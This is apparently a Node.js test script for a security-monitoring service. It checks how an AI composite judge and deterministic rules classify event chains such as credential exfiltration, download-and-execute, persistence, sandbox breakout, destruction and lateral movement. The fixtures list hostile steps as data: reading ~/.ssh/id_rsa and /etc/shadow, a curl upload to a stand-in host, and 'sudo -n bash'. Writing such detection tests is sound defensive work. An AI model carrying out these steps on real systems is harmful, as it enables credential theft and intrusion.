#!/usr/bin/env node

import assert from 'node:assert/strict';
import {
  compositePrompt,
  deterministicSupplyChainDecision,
  deterministicSupplyChainTemporalDecision,
  deterministicTemporalDecision,
  parseCompositeDecision,
} from '../apps/api/dist/security-monitoring/stream-worker-main.js';
import {
  collapseCompositeJudgmentRevisions,
} from '../apps/api/dist/security-monitoring/streaming-finding.service.js';

const batch = {
  schemaVersion: 'anysentry.risk_analysis_batch.v1',
  episodeId: 'ep_test',
  revision: 2,
  supersedesRevision: 1,
  evidenceFingerprint: 'evidence_test',
  triggerReason: 'critical_evidence',
  tenantId: 'default',
  environmentId: 'test',
  workspaceId: 'ws_test',
  workspacePath: '/workspace/project',
  agentCorrelationId: 'agc_test',
  agentType: 'a3s code',
  sessionId: 'session-test',
  traceIds: ['trace-test'],
  windowStart: 1_785_000_000_000,
  windowEnd: 1_785_000_030_000,
  generatedAt: 1_785_000_040_000,
  candidateType: 'sensitive_data_egress',
  decisionPath: 'composite_judge',
  ruleVersion: 'composite-risk-v2',
  decisionSource: 'composite_judge',
  synthetic: false,
  evidence: [
    {
      eventId: 'evt_read',
      eventTime: 1_785_000_000_000,
      eventKind: 'FileAccess',
      operation: 'file_read',
      subject: 'file /home/test/.ssh/id_rsa',
      resource: '/home/test/.ssh/id_rsa',
      dangerous: false,
      sensitiveResource: true,
      externalDestination: false,
      failed: false,
      argvTruncated: false,
      behaviorStage: 'credential_access',
      platformRuntime: false,
      synthetic: false,
      judgment: {
        stage: 'L2',
        status: 'succeeded',
        verdict: 'allow',
        reason: 'single read may be legitimate',
        latencyMs: 800,
        revision: 1,
      },
    },
    {
      eventId: 'evt_egress',
      eventTime: 1_785_000_030_000,
      eventKind: 'Egress',
      operation: 'egress',
      subject: 'curl https://unknown.example/upload',
      destination: 'unknown.example',
      dangerous: false,
      sensitiveResource: false,
      externalDestination: true,
      failed: false,
      command: 'curl https://unknown.example/upload',
      executable: 'curl',
      argvTruncated: false,
      behaviorStage: 'external_egress',
      platformRuntime: false,
      synthetic: false,
    },
  ],
  shadow: true,
};

const prompt = compositePrompt(batch);
assert.match(prompt, /<<UNTRUSTED_EVIDENCE>>/);
assert.match(prompt, /evt_read/);
assert.match(prompt, /singleEventJudgment/);
assert.match(prompt, /Return one JSON object/i);
assert.match(prompt, /platformRuntime/);
assert.match(prompt, /confirmed_attack/);

const decision = parseCompositeDecision(JSON.stringify({
  classification: 'confirmed_attack',
  verdict: 'block',
  severity: 'critical',
  confidence: 0.91,
  attackType: 'credential exfiltration',
  reason: 'A sensitive credential read was followed by external egress.',
  evidenceEventIds: ['evt_read', 'evt_egress', 'evt_invented'],
}), batch);
assert.equal(decision.verdict, 'block');
assert.equal(decision.classification, 'confirmed_attack');
assert.equal(decision.confidence, 0.91);
assert.deepEqual(decision.evidenceEventIds, ['evt_read', 'evt_egress']);
assert.equal(
  parseCompositeDecision(`\`\`\`json
${JSON.stringify({
    classification: 'suspicious',
    verdict: 'allow',
    severity: 'medium',
    confidence: 0.7,
    attackType: 'download-and-execute',
    reason: 'Incomplete chain requires investigation.',
    evidenceEventIds: ['evt_read', 'evt_egress'],
  })}
\`\`\``, batch).classification,
  'suspicious',
);

const syntheticDecision = parseCompositeDecision(JSON.stringify({
  classification: 'confirmed_attack',
  verdict: 'block',
  severity: 'critical',
  confidence: 0.95,
  attackType: 'credential exfiltration',
  reason: 'The fixture resembles a credential exfiltration chain.',
  evidenceEventIds: ['evt_read', 'evt_egress'],
}), { ...batch, synthetic: true });
assert.equal(syntheticDecision.classification, 'simulation');
assert.equal(syntheticDecision.verdict, 'allow');
assert.equal(syntheticDecision.severity, 'low');
assert.equal(syntheticDecision.attackType, 'none');

assert.throws(
  () => parseCompositeDecision('{"verdict":"allow"} trailing text', batch),
  /invalid classification/,
);
assert.throws(
  () => parseCompositeDecision(JSON.stringify({
    classification: 'suspicious',
    verdict: 'escalate',
    severity: 'high',
    confidence: 0.8,
    reason: 'uncertain',
    evidenceEventIds: [],
  }), batch),
  /invalid verdict/,
);
assert.throws(
  () => parseCompositeDecision(JSON.stringify({
    classification: 'suspicious',
    verdict: 'block',
    severity: 'high',
    confidence: 0.8,
    reason: 'worth investigating but not proven',
    evidenceEventIds: ['evt_read', 'evt_egress'],
  }), batch),
  /inconsistent classification/,
);

const completedRevision = {
  schemaVersion: 'anysentry.stream_finding.v1',
  findingType: 'composite_judgment',
  findingId: 'composite-ep_test-5',
  episodeId: 'ep_test',
  revision: 5,
  evidenceFingerprint: 'fingerprint-5',
  tenantId: 'default',
  environmentId: 'test',
  workspaceId: 'ws_test',
  workspacePath: '/workspace/project',
  agentCorrelationId: 'agc_test',
  agentType: 'a3s code',
  sessionId: 'session-test',
  traceIds: ['trace-test'],
  windowStart: 1_785_000_000_000,
  windowEnd: 1_785_000_030_000,
  judgedAt: 1_785_000_040_000,
  status: 'succeeded',
  verdict: 'allow',
  severity: 'medium',
  confidence: 0.7,
  classification: 'suspicious',
  attackType: 'suspicious chain',
  reason: 'The completed revision remains the active conclusion.',
  evidenceEventIds: ['evt_read', 'evt_egress'],
  evidence: batch.evidence,
  model: 'deepseek-v4-pro',
  latencyMs: 2_000,
  ruleVersion: 'composite-risk-v2',
  synthetic: false,
  shadow: true,
};
const pendingRevision = {
  ...completedRevision,
  findingId: 'composite-ep_test-6',
  revision: 6,
  evidenceFingerprint: 'fingerprint-6',
  judgedAt: 1_785_000_050_000,
  status: 'pending',
  verdict: undefined,
  severity: undefined,
  confidence: undefined,
  classification: undefined,
  attackType: undefined,
  reason: undefined,
  evidenceEventIds: [],
  latencyMs: 1,
};
const [stableView] = collapseCompositeJudgmentRevisions([pendingRevision, completedRevision]);
assert.equal(stableView.status, 'succeeded', 'a pending revision must not replace the last completed conclusion');
assert.equal(stableView.classification, 'suspicious');
assert.equal(stableView.revision, 5);
assert.equal(stableView.updateRevision, 6);
assert.equal(stableView.updateStatus, 'pending');

const supplyChainBatch = {
  ...batch,
  episodeId: 'ep_supply_chain',
  candidateType: 'known_vulnerability_exploitation',
  decisionPath: 'deterministic_rule',
  ruleVersion: 'supply-chain-exploit-v1',
  evidence: [
    {
      ...batch.evidence[0],
      eventId: 'evt_component',
      behaviorStage: 'vulnerable_component_execution',
      runtimeVulnerabilities: [{
        findingId: 'finding-1',
        dependencySnapshotId: 'deps-1',
        vulnerabilityAssessmentId: 'va-1',
        ecosystem: 'npm',
        packageName: 'webpack',
        version: '5.98.0',
        vulnerabilityId: 'GHSA-test',
        aliases: [],
        confidence: 'high',
        matchBasis: 'node_modules path',
      }],
    },
    {
      ...batch.evidence[0],
      eventId: 'evt_dangerous',
      behaviorStage: 'dangerous_exec',
      runtimeVulnerabilities: [],
    },
    {
      ...batch.evidence[0],
      eventId: 'evt_sensitive',
      behaviorStage: 'credential_access',
      runtimeVulnerabilities: [],
    },
    {
      ...batch.evidence[1],
      eventId: 'evt_external',
      runtimeVulnerabilities: [],
    },
  ],
};
const deterministicDecision = deterministicSupplyChainDecision(supplyChainBatch);
assert.equal(deterministicDecision.classification, 'confirmed_attack');
assert.equal(deterministicDecision.verdict, 'block');
assert.equal(deterministicDecision.evidenceEventIds.length, 4);
const syntheticSupplyChainDecision = deterministicSupplyChainDecision({
  ...supplyChainBatch,
  synthetic: true,
});
assert.equal(syntheticSupplyChainDecision.classification, 'simulation');
assert.equal(syntheticSupplyChainDecision.verdict, 'allow');
assert.equal(syntheticSupplyChainDecision.attackType, 'known-vulnerability-exploitation');

const strongProcess = (pid, ppid, rootPid = 10) => ({
  hostId: 'node-1',
  bootId: 'boot-1',
  pid,
  ppid,
  rootPid,
  processInstanceId: `process-${pid}`,
  identityConfidence: 'strong',
});
const supplyChainTemporalBatch = {
  ...supplyChainBatch,
  episodeId: 'ste_supply_chain',
  ruleVersion: 'supply-chain-temporal-v2',
  evidenceConfidence: 'strong',
  evidence: [
    {
      ...supplyChainBatch.evidence[0],
      eventId: 'evt_component_v2',
      eventTime: 1_785_000_000_000,
      processIdentity: strongProcess(100, 10),
    },
    {
      ...batch.evidence[0],
      eventId: 'evt_shell_v2',
      eventTime: 1_785_000_001_000,
      operation: 'execute',
      executable: 'bash',
      behaviorStage: 'shell_execution',
      processIdentity: strongProcess(101, 100),
      runtimeVulnerabilities: [],
    },
    {
      ...batch.evidence[1],
      eventId: 'evt_egress_v2',
      eventTime: 1_785_000_002_000,
      operation: 'egress',
      externalDestination: true,
      processIdentity: strongProcess(102, 101),
      runtimeVulnerabilities: [],
    },
  ],
};
const supplyChainTemporalDecision = deterministicSupplyChainTemporalDecision(
  supplyChainTemporalBatch,
);
assert.equal(supplyChainTemporalDecision.classification, 'suspicious');
assert.equal(supplyChainTemporalDecision.verdict, 'allow');
assert.equal(supplyChainTemporalDecision.evidenceEventIds.length, 3);
assert.equal(
  deterministicSupplyChainTemporalDecision({
    ...supplyChainTemporalBatch,
    synthetic: true,
  }).attackType,
  'known-vulnerability-exploitation',
);
assert.throws(
  () => deterministicSupplyChainTemporalDecision({
    ...supplyChainTemporalBatch,
    evidence: supplyChainTemporalBatch.evidence.map((item, index) =>
      index === 1
        ? { ...item, processIdentity: strongProcess(201, 200) }
        : item),
  }),
  /process-lineage/,
);

const temporalFileIdentity = {
  fileInstanceId: 'flp_test_payload',
  path: '/tmp/temporal-payload',
  mountNamespace: 4_026_531_840,
  identityBasis: 'scoped_path',
  identityConfidence: 'medium',
};
const temporalBatch = {
  ...batch,
  episodeId: 'tep_download_execute',
  revision: 1,
  supersedesRevision: undefined,
  triggerReason: 'pattern_match',
  candidateType: 'download_execute',
  decisionPath: 'deterministic_rule',
  ruleVersion: 'temporal-episode-v1',
  evidenceConfidence: 'medium',
  evidence: [
    {
      ...batch.evidence[0],
      eventId: 'evt_download',
      eventTime: 1_785_000_000_000,
      operation: 'download',
      fileIdentity: temporalFileIdentity,
    },
    {
      ...batch.evidence[0],
      eventId: 'evt_write',
      eventTime: 1_785_000_001_000,
      operation: 'file_write',
      fileIdentity: temporalFileIdentity,
    },
    {
      ...batch.evidence[0],
      eventId: 'evt_chmod',
      eventTime: 1_785_000_002_000,
      operation: 'chmod',
      fileIdentity: temporalFileIdentity,
    },
    {
      ...batch.evidence[0],
      eventId: 'evt_execute',
      eventTime: 1_785_000_003_000,
      operation: 'execute',
      fileIdentity: temporalFileIdentity,
    },
  ],
};
const temporalDecision = deterministicTemporalDecision(temporalBatch);
assert.equal(temporalDecision.classification, 'suspicious');
assert.equal(temporalDecision.verdict, 'allow');
assert.equal(temporalDecision.attackType, 'download-and-execute');
assert.equal(temporalDecision.evidenceEventIds.length, 4);
assert.equal(
  deterministicTemporalDecision({ ...temporalBatch, synthetic: true }).attackType,
  'download-and-execute',
);
assert.throws(
  () => deterministicTemporalDecision({
    ...temporalBatch,
    evidence: temporalBatch.evidence.map((item, index) =>
      index === 3
        ? { ...item, fileIdentity: { ...temporalFileIdentity, fileInstanceId: 'other-file' } }
        : item),
  }),
  /one file identity/,
);

const advancedEvidence = (id, eventTime, operation, {
  resource,
  destination,
  behaviorStage,
  sensitiveResource = false,
  dangerous = false,
  fileIdentity,
  rootPid = 1200,
} = {}) => ({
  ...batch.evidence[0],
  eventId: id,
  eventTime,
  operation,
  resource,
  destination,
  behaviorStage,
  sensitiveResource,
  dangerous,
  externalDestination: false,
  fileIdentity,
  processIdentity: strongProcess(rootPid + Math.floor(eventTime / 1_000), rootPid, rootPid),
});

const persistenceIdentity = {
  ...temporalFileIdentity,
  fileInstanceId: 'flp_persistence_target',
  path: '/etc/systemd/system/anysentry-demo.service',
  identityConfidence: 'strong',
};
const persistenceBatch = {
  ...temporalBatch,
  episodeId: 'tep_persistence',
  ruleVersion: 'temporal-episode-v2',
  candidateType: 'persistence_installation',
  evidenceConfidence: 'strong',
  evidence: [
    advancedEvidence('evt_persistence_write', 1_000, 'file_write', {
      resource: persistenceIdentity.path,
      behaviorStage: 'persistence_write',
      fileIdentity: persistenceIdentity,
    }),
    advancedEvidence('evt_persistence_activate', 2_000, 'persistence_activate', {
      resource: persistenceIdentity.path,
      behaviorStage: 'persistence_activation',
      fileIdentity: persistenceIdentity,
    }),
  ],
};
assert.equal(deterministicTemporalDecision(persistenceBatch).attackType, 'persistence-installation');
assert.throws(
  () => deterministicTemporalDecision({
    ...persistenceBatch,
    evidence: persistenceBatch.evidence.map((item, index) =>
      index === 1 ? { ...item, resource: '/etc/systemd/system/other.service' } : item),
  }),
  /activation target/,
);

const sandboxBatch = {
  ...temporalBatch,
  episodeId: 'tep_sandbox',
  ruleVersion: 'temporal-episode-v2',
  candidateType: 'sandbox_privilege_breakout',
  evidenceConfidence: 'strong',
  evidence: [
    advancedEvidence('evt_sandbox_probe', 1_000, 'sandbox_probe', {
      resource: 'unshare --user --mount',
      behaviorStage: 'sandbox_probe',
    }),
    advancedEvidence('evt_privilege_change', 2_000, 'privilege_change', {
      resource: 'sudo -n bash',
      behaviorStage: 'privilege_change',
    }),
    advancedEvidence('evt_shadow_read', 3_000, 'file_read', {
      resource: '/etc/shadow',
      behaviorStage: 'credential_access',
      sensitiveResource: true,
    }),
  ],
};
assert.equal(deterministicTemporalDecision(sandboxBatch).attackType, 'sandbox-privilege-breakout');
assert.throws(
  () => deterministicTemporalDecision({
    ...sandboxBatch,
    evidence: sandboxBatch.evidence.map((item, index) =>
      index === 2
        ? { ...item, processIdentity: { ...item.processIdentity, rootPid: 2200 } }
        : item),
  }),
  /process scope/,
);

const destructiveBatch = {
  ...temporalBatch,
  episodeId: 'tep_destructive',
  ruleVersion: 'temporal-episode-v2',
  candidateType: 'destructive_behavior',
  evidenceConfidence: 'strong',
  evidence: [
    advancedEvidence('evt_discover', 1_000, 'target_discovery', {
      resource: '/srv/app',
      behaviorStage: 'target_discovery',
    }),
    advancedEvidence('evt_destroy_1', 2_000, 'destroy', {
      resource: '/srv/app/a',
      behaviorStage: 'destructive_action',
    }),
    advancedEvidence('evt_destroy_2', 3_000, 'destroy', {
      resource: '/srv/app/b',
      behaviorStage: 'destructive_action',
    }),
  ],
};
assert.equal(deterministicTemporalDecision(destructiveBatch).attackType, 'destructive-behavior');
assert.throws(
  () => deterministicTemporalDecision({
    ...destructiveBatch,
    evidence: destructiveBatch.evidence.map((item, index) =>
      index === 2 ? { ...item, resource: '/var/log/b' } : item),
  }),
  /path scope/,
);

const sshIdentity = {
  ...temporalFileIdentity,
  fileInstanceId: 'flp_ssh_key',
  path: '/home/test/.ssh/id_demo',
  identityConfidence: 'strong',
};
const lateralBatch = {
  ...temporalBatch,
  episodeId: 'tep_lateral',
  ruleVersion: 'temporal-episode-v2',
  candidateType: 'lateral_movement',
  evidenceConfidence: 'strong',
  evidence: [
    advancedEvidence('evt_ssh_key', 1_000, 'file_read', {
      resource: sshIdentity.path,
      behaviorStage: 'credential_access',
      sensitiveResource: true,
      fileIdentity: sshIdentity,
    }),
    advancedEvidence('evt_remote_connect', 2_000, 'remote_connect', {
      resource: sshIdentity.path,
      destination: '10.0.0.8',
      behaviorStage: 'lateral_connect',
      fileIdentity: sshIdentity,
    }),
    advancedEvidence('evt_remote_execute', 3_000, 'remote_execute', {
      resource: sshIdentity.path,
      destination: '10.0.0.8',
      behaviorStage: 'lateral_action',
      fileIdentity: sshIdentity,
    }),
  ],
};
assert.equal(deterministicTemporalDecision(lateralBatch).attackType, 'lateral-movement');
assert.throws(
  () => deterministicTemporalDecision({
    ...lateralBatch,
    evidence: lateralBatch.evidence.map((item, index) =>
      index === 2 ? { ...item, destination: '10.0.0.9' } : item),
  }),
  /credential and destination/,
);

console.log('Streaming phase 2 composite judgment contract verification passed');
